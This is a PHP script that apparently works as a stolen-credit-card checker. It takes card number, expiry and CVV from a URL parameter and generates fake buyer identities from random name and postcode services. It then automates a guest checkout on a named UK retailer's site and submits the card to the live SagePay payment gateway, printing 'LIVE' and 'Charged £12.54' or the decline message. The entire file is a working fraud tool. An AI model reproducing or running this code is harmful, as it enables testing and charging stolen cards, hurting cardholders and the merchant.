<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $postcodes = file_get_contents('http://api.postcodes.io/random/postcodes');
    $getUkPostcode = json_decode($postcodes, true);
    $postcode = $getUkPostcode['result']['postcode'];
    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united%20states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $city = preg_split("/[\s,]+/", $data['street2'])[0];
    $state = preg_split("/[\s,]+/", $data['street2'])[1];
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.bertiesdirect.co.uk/syr-interchange-kentucky-mop-blue-16oz',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        )
    ));
    $getItemDetails = curl_exec($ch);
    $productDetails = GetStr($getItemDetails, '<form action="', '"');
    $uenc = GetStr($productDetails, '/uenc/', '/');
    $productId = GetStr($productDetails, '/product/', '/');
    $formKey = GetStr($productDetails, '/form_key/', '/');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.bertiesdirect.co.uk/checkout/cart/ajaxAdd/uenc/'.$uenc.'/product/'.$productId.'/form_key/'.$formKey.'/',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: application/json, text/javascript, */*; q=0.01',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://www.bertiesdirect.co.uk',
            'Referer: https://www.bertiesdirect.co.uk/syr-interchange-kentucky-mop-blue-16oz',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "form_key=$formKey&product=$productId&related_product=&qty=1"
    ));
    $addToCart = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.bertiesdirect.co.uk/checkout/onepage/login',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://www.bertiesdirect.co.uk',
            'Referer: https://www.bertiesdirect.co.uk/checkout/onepage/login/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "form_key=$formKey&login%5Busername%5D=$cookie@gmail.com&checkout_method=guest&login%5Bpassword%5D="
    ));
    $login = curl_exec($ch);
    $shippingMethod = GetStr($login, '<input name="shipping_method" type="radio" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.bertiesdirect.co.uk/checkout/onepage/updateShippingMethod/',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/javascript, text/html, application/xml, text/xml, */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://www.bertiesdirect.co.uk',
            'Referer: https://www.bertiesdirect.co.uk/checkout/onepage/shipping/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "countryID=GB&postcode=$postcode"
    ));
    $updateShippingMethod = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.bertiesdirect.co.uk/checkout/onepage/billing/',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://www.bertiesdirect.co.uk',
            'Referer: https://www.bertiesdirect.co.uk/checkout/onepage/shipping/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "shipping%5Baddress_id%5D=121043&customer%5Bemail%5D=$cookie@gmail.com&customer%5Bfirstname%5D=$fname&customer%5Bmiddlename%5D=&customer%5Blastname%5D=$lname&customer%5Btelephone%5D=$phone&shipping%5Bcountry_id%5D=GB&shipping%5Bpostcode%5D=$postcode&shipping%5Bfirstname%5D=$fname&shipping%5Bmiddlename%5D=&shipping%5Blastname%5D=$lname&shipping%5Bstreet%5D%5B%5D=$street&shipping%5Bstreet%5D%5B%5D=&shipping%5Bcity%5D=$city&shipping%5Bregion_id%5D=&shipping%5Bregion%5D=&shipping%5Btelephone%5D=$phone&shipping%5Bsave_in_address_book%5D=1&shipping_method=$shippingMethod&form_key=$formKey"
    ));
    $billing = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.bertiesdirect.co.uk/checkout/onepage/review/',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/javascript, text/html, application/xml, text/xml, */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://www.bertiesdirect.co.uk',
            'Referer: https://www.bertiesdirect.co.uk/checkout/onepage/billing/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "billing%5Bemail%5D=$cookie@gmail.com&billing%5Buse_shipping%5D=1&billing_address_id=1&billing%5Baddress_id%5D=121042&billing%5Bfirstname%5D=&billing%5Bmiddlename%5D=&billing%5Blastname%5D=&billing%5Bcountry_id%5D=GB&billing%5Bpostcode%5D=&billing%5Bstreet%5D%5B%5D=&billing%5Bstreet%5D%5B%5D=&billing%5Bcity%5D=&billing%5Bregion_id%5D=&billing%5Bregion%5D=&billing%5Btelephone%5D=$phone&billing%5Btaxvat%5D=&billing%5Bsave_in_address_book%5D=1&billing%5Buse_for_shipping%5D=1&payment%5Bmethod%5D=sagepayserver&form_key=$formKey&billing%5Bcustomer_password%5D=hanasakura1"
    ));
    $review = curl_exec($ch);
    $SID = GetStr($review, "Set-Cookie: frontend=", ";");

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.bertiesdirect.co.uk/sgps/payment/onepageSaveOrder/?SID='.$SID,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/javascript, text/html, application/xml, text/xml, */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://www.bertiesdirect.co.uk',
            'Referer: https://www.bertiesdirect.co.uk/checkout/onepage/billing/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "payment%5Bmethod%5D=sagepayserver&form_key=$formKey"
    ));
    $submitSID = curl_exec($ch);
    $txid = GetStr($submitSID, '"vps_tx_id":"', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://live.sagepay.com/gateway/service/cardselection?vpstxid='.$txid,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://www.bertiesdirect.co.uk/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        )
    ));
    $getJSessionId = curl_exec($ch);
    $jSessionId = GetStr($getJSessionId, "carddetails;jsessionid=", "\r\n");

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://live.sagepay.com/gateway/service/carddetails;jsessionid='.$jSessionId,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://www.bertiesdirect.co.uk/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        )
    ));
    $submitJSessionId = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://live.sagepay.com/gateway/service/carddetails',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://live.sagepay.com',
            'Referer: https://live.sagepay.com/gateway/service/carddetails;jsessionid='.$jSessionId,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "cardholder=$fname+$lname&cardnumber=$cc&expirymonth=$mm&expiryyear=".substr($yy, 2, 4)."&securitycode=$cvv&action=proceed&browserJavaEnabled=false&browserColorDepth=24&browserScreenHeight=1080&browserScreenWidth=1920&browserTZ=-480&challengeWindowSize=05"
    ));
    $execute = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://live.sagepay.com/gateway/service/carddetails',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://live.sagepay.com/gateway/service/authorisation',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'
        )
    ));
    $getResponse = curl_exec($ch);
    curl_close($ch);
    $response = GetStr($getResponse, '<div class="notification">', ' Please try a different card.');

    if (strpos($getResponse, '/checkout/onepage/success/')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged £12.54</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("$cookie.txt");
?>